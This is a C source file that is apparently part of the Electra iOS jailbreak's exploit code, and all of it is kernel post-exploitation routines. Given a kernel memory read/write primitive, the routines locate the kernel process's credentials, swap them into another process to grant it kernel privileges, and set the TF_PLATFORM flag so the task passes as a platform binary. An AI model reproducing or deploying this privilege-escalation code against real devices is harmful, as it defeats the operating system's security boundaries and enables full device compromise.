#include <CoreFoundation/CoreFoundation.h>
#include <stdio.h>
#include <stdlib.h>

#include <mach/mach.h>

#include "../../headers/common.h"
#include "../../headers/IOKit.h"

#include "KernelMemory.h"
#include "kernel_memory.h"
#include "offsets.h"
#include "KernelUtilities.h"
#include "kutils.h"
#include "../electra.h"
#include "exploit_additions.h"
//#include "find_port.h"

#define TF_PLATFORM 0x00000400 /* task is a platform binary */

uint64_t the_realhost;
uint64_t kernel_base;
//offsets_t offs;

//uint64_t cached_task_self_addr = 0;
/*uint64_t get_proc_struct_for_pid(pid_t pid)
{
    uint64_t proc = MReadKernel64(MReadKernel64(koffset(kernel_task)) + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    while (proc) {
        if (MReadKernel32(proc + koffset(KSTRUCT_OFFSET_PROC_PID)) == pid)
            return proc;
        proc = MReadKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_P_LIST));
    }
    return 0;
}

uint64_t get_address_of_port(pid_t pid, mach_port_t port)
{
    uint64_t proc_struct_addr = get_proc_struct_for_pid(pid);
    uint64_t task_addr = MReadKernel64(proc_struct_addr + koffset(KSTRUCT_OFFSET_PROC_TASK));
    uint64_t itk_space = MReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = MReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint64_t port_addr = MReadKernel64(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}
*/
uint64_t get_kernel_cred_addr()
{
    uint64_t kernel_proc_struct_addr = MReadKernel64(MReadKernel64(koffset(kernel_task)) + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    return MReadKernel64(kernel_proc_struct_addr + koffset(KSTRUCT_OFFSET_PROC_UCRED));
}

uint64_t give_creds_to_process_at_addr(uint64_t proc, uint64_t cred_addr)
{
    uint64_t orig_creds = MReadKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
    MWriteKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), cred_addr);
    return orig_creds;
}

void set_platform_binary(uint64_t proc)
{
    uint64_t task_struct_addr = MReadKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_TASK));
    uint32_t task_t_flags = MReadKernel32(task_struct_addr + koffset(KSTRUCT_OFFSET_TASK_TFLAGS));
    task_t_flags |= TF_PLATFORM;
    MWriteKernel32(task_struct_addr + koffset(KSTRUCT_OFFSET_TASK_TFLAGS), task_t_flags);
}

uint64_t current_thread() {
    uint64_t thread_port = find_port(mach_thread_self());
    return rk64m(thread_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
}
